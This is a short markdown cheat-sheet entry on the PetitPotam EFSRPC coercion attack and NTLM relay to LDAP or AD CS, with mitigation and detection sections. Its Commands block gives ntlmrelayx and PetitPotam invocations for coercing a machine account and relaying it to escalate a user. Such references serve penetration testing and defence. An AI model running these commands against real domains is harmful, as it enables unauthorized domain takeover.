---
topic: PetitPotam — EFSRPC coercion and NTLM relay
tags: [windows, active-directory, petitpotam, ntlm-relay, coercion]
---

# PetitPotam — EFSRPC coercion and NTLM relay

**English** | [🌐 Español](petitpotam-coercion.md)

## Concept

PetitPotam abuses MS-EFSRPC to force a Windows machine to authenticate to an attacker-controlled host. If LDAP signing or SMB signing is not required, the machine account NetNTLM hash can be relayed to LDAP or AD CS for domain access. It is a coercion primitive, not password theft.

## When it applies

- The victim exposes EFSRPC and is unpatched against CVE-2021-36942.
- LDAP signing, channel binding or SMB signing is not enforced.
- The goal is to move from a machine account to domain or AD CS privileges.

## Procedure

1. Check whether the host answers EFSRPC and whether LDAP/SMB signing is disabled.
2. Start `ntlmrelayx` against LDAP or AD CS with the right target.
3. Run PetitPotam against the victim and the listener.
4. Use the relayed session to add a shadow credential, change a password or request a certificate.

## Commands

```bash
ntlmrelayx.py -t ldap://<DC> --escalate-user <USER>
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p '<PASS>' <LISTENER> <TARGET>
# EFSRPC variant
python3 PetitPotam.py -pipe efsrpc <LISTENER> <TARGET>
```

## Variants

- Relay to AD CS (`http://<CA>/certsrv/certfnsh.asp`) for a machine certificate.
- Use DFSCoerce or ShadowCoerce when EFSRPC is blocked.
- Combine it with shadow credentials on the relayed account.

## Limitations

- Microsoft patched CVE-2021-36942; updated hosts reject coercion.
- LDAP signing, channel binding and SMB signing block the relay.
- The machine account must have useful permissions at the destination.

## Mitigation

- Apply the CVE-2021-36942 patch and disable EFSRPC when unused.
- Require LDAP signing, channel binding, SMB signing and EPA.
- Audit relays and restrict outbound SMB from workstations.

## Detection

- Machine-account authentications to hosts that are not DCs.
- 4624/4768 events with an unexpected source and NTLM.
- EFSRPC traffic from a host that does not use Encrypting File System.

## References

- [0xdf — Mist](https://0xdf.gitlab.io/2024/10/26/htb-mist.html)
- [NVD — CVE-2021-36942](https://nvd.nist.gov/vuln/detail/CVE-2021-36942)
- [PetitPotam — GitHub](https://github.com/topotam/PetitPotam)
